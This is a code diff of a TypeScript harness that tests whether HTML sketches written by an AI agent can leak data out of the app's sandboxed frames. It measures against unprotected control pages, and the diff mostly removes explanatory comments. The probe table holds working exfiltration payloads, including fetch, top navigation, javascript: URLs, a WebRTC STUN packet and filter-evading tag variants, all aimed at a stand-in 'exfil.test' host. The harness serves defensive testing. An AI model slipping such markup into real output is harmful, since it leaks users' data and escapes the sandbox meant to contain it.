@@ -1,31 +1,5 @@
-// `pnpm sketch-frames`: decision 0033's loopback harness, run against
-// Oriel's real window and its real sketch route, in the installed Chrome.
-// It reaches nothing but 127.0.0.1.
-//
-// Each probe is HTML an agent might write to get something out: a fetch, a
-// navigation, a lookup or a STUN packet. Every probe goes to a thread's
-// agent as a sketch() call, in Oriel's real server. One the check refuses
-// shows nothing. One it lets through is framed in the thread's page, from
-// the sketch origin, and must reach nothing: no request, TCP connection or
-// DNS lookup to the probe's host, no UDP packet, no popup, and no move of
-// the page. A probe whose name starts with `click-` is clicked, inside the
-// frame.
-//
-// Each probe also runs unprotected, as controls, so "reached nothing" means
-// the probe would have fired: as a top-level page, in a frame with no
-// sandbox, and in a frame sandboxed with no token, as Oriel's are, each in a
-// page with no policy. The last is where scripts are off, so `<noscript>`
-// is markup. A control the spike saw fire that no longer fires fails the
-// run too, since then the harness proves nothing for it.
-//
-// Re-run it whenever Chrome's major version changes. `--desktop` runs it
-// in the desktop app's own engine instead, which must pass before the app
-// ships (decision 0033, packages/desktop/README.md): a copy of the built
-// app whose Electron, fuses and all, is untouched, with the probe build's
-// main process (packages/desktop/probe/) in place of the shell's. It sets
-// up the window's engine with the shell's own code, and lets the harness
-// drive it through the DevTools port the shell refuses. It reads the clock,
-// so it is a script, not a test. Over any leak, it exits 1.
+// `pnpm sketch-frames [--desktop]`; exits 1 over any leak. Re-run it whenever Chrome's major
+// version changes; `--desktop`, in the app's own engine, must pass before the app ships.
 import { execFileSync, spawn } from "node:child_process";
 import { createHash } from "node:crypto";
 import dgram from "node:dgram";
@@ -54,7 +28,6 @@ const listen = (server: http.Server) =>
     }),
   );
 
-// The sink: every request and every TCP connection, by Host.
 const hits: { host: string; url: string; method: string }[] = [];
 let connections = 0;
 const sink = http.createServer((req, res) => {
@@ -64,15 +37,12 @@ const sink = http.createServer((req, res) => {
 });
 sink.on("connection", () => (connections += 1));
 const sinkPort = await listen(sink);
-// STUN: any UDP datagram at all.
 let datagrams = 0;
 const stun = dgram.createSocket("udp4");
 stun.on("message", () => (datagrams += 1));
 await new Promise<void>((resolve) => stun.bind(0, "127.0.0.1", resolve));
 const stunPort = stun.address().port;
 
-// Each probe is named, and its HTML names its own host, `<probe>--<arm>`,
-// so each arm's requests and lookups are its own.
 type Probe = (at: (path?: string) => string, host: string) => string;
 const svg64 = (svg: string) => Buffer.from(svg).toString("base64");
 const probes: Record<string, Probe> = {
@@ -135,7 +105,6 @@ const probes: Record<string, Probe> = {
   "script-top-nav": (at) => `<script>top.location="${at()}"</script>`,
   webrtc: () =>
     `<script>const pc=new RTCPeerConnection({iceServers:[{urls:"stun:127.0.0.1:${stunPort}"}]});pc.createDataChannel("x");pc.createOffer().then(o=>pc.setLocalDescription(o))</script>`,
-  // Attempts on the check's scan.
   "upper-iframe": (at) => `<IFRAME SRC="${at()}"></IFRAME>`,
   "slash-iframe": (at) => `<iframe/src="${at()}"></iframe>`,
   "ff-iframe": (at) => `<iframe\fsrc="${at()}"></iframe>`,
@@ -151,7 +120,6 @@ const probes: Record<string, Probe> = {
   "button-formaction": (at) => `<button formaction="${at()}">go</button>`,
   "input-image": (at) => `<input type="image" src="${at()}">`,
   "use-external": (at) => `<svg><use href="${at("u.svg")}#a"/></svg>`,
-  // A person clicks #go.
   "click-a-self": (at) => `<a id="go" href="${at()}">go</a>`,
   "click-a-blank": (at) => `<a id="go" href="${at()}" target="_blank">go</a>`,
   "click-a-top": (at) => `<a id="go" href="${at()}" target="_top">go</a>`,
@@ -172,14 +140,7 @@ const probes: Record<string, Probe> = {
   "click-js-url": (at) => `<a id="go" href="javascript:fetch('${at()}')">go</a>`,
 };
 
-// Probes whose controls never fire, even unprotected, so they prove
-// nothing here (decision 0033). The harness sees no connection or lookup
-// from a preconnect or dns-prefetch; Chrome runs no speculation rules here,
-// draws no external `use`, fetches no `filter` URL, follows no gradient's
-// data: href, and draws nothing from a `use` of a data: SVG to click. And
-// some are the scan's attempts that are only ever text (a comment, an
-// escaped tag, an element inside SVG's `<style>`), an image that loads
-// nothing, or a button with no form to send.
+// Controls that never fire even unprotected, so they prove nothing here.
 const silent = new Set([
   "link-preconnect",
   "link-dns-prefetch",
@@ -199,8 +160,6 @@ const silent = new Set([
   ...(values.desktop ? ["link-icon"] : []),
 ]);
 
-// Oriel's real server, whose agent sends each thread's message, a probe's
-// name and arm, to sketch() in the real sandbox.
 const sketchOf = new Map<string, string>();
 const serving = await serve(0, {
   db: ":memory:",
@@ -226,8 +185,6 @@ const { id: workstream } = await api<{ id: string }>("/api/workstreams", {
   cluster: "10001",
 });
 
-// The controls' server: the probe as a page of its own, and a frame of it,
-// with no sandbox or one with no token, in a page with no policy.
 const controls = http.createServer((req, res) => {
   const url = new URL(req.url ?? "/", "http://x");
   const html = controlHtml.get(url.searchParams.get("tag") ?? "");
@@ -249,7 +206,6 @@ const engineArgs = [
   `--log-net-log=${netlog}`,
 ];
 
-// A page in its own window, and the popups it asked for.
 type Opened = { page: Page; popups: string[]; close: () => Promise<void> };
 type Engine = {
   name: string;
@@ -257,7 +213,6 @@ type Engine = {
   close(): Promise<void>;
 };
 
-// The installed Chrome: each page in a context of its own.
 async function chrome(): Promise<Engine> {
   const browser = await chromium.launch({
     channel: "chrome",
@@ -281,8 +236,6 @@ async function chrome(): Promise<Engine> {
 const sha256 = (path: string) => createHash("sha256").update(readFileSync(path)).digest("hex");
 const framework = "Contents/Frameworks/Electron Framework.framework/Electron Framework";
 
-// The desktop app's engine: the probe build, which opens each page in a
-// hidden window of its own when asked on its stdin (packages/desktop/probe/).
 async function desktop(): Promise<Engine> {
   const root = fileURLToPath(new URL("../", import.meta.url));
   const built = build(false);
@@ -400,7 +353,6 @@ console.log(`engine: ${engine.name}`);
 type Seen = { leaks: string[]; note?: string };
 const settleMs = 1200;
 
-// Opens `url` and, for a click probe, clicks #go in `frames` nested frames.
 async function watch(tag: string, url: string, frames: number, click: boolean): Promise<Seen> {
   const before = { hits: hits.length, datagrams, connections };
   const { page, popups, close } = await engine.open(url);
@@ -450,7 +402,6 @@ for (const [name, probe] of Object.entries(probes)) {
       seen: await watch(tag, url, arm === "top" ? 0 : 1, click),
     });
   }
-  // Oriel: the probe as the agent's sketch, in a thread of its own.
   const tag = `${name}--oriel`;
   const html = probe(
     (path = "x") => `http://${tag}.exfil.test:${sinkPort}/${path}`,
@@ -472,8 +423,6 @@ for (const [name, probe] of Object.entries(probes)) {
   });
 }
 
-// Height and theme: the frame is 240 pixels, a taller sketch scrolls in it,
-// and the sheet follows the page's scheme.
 sketchOf.set("theme", `<p>tall</p><div style="height:2000px"></div>`);
 const { id: themed } = await api<{ id: string }>(`/api/workstreams/${workstream}/threads`, {
   text: "theme",
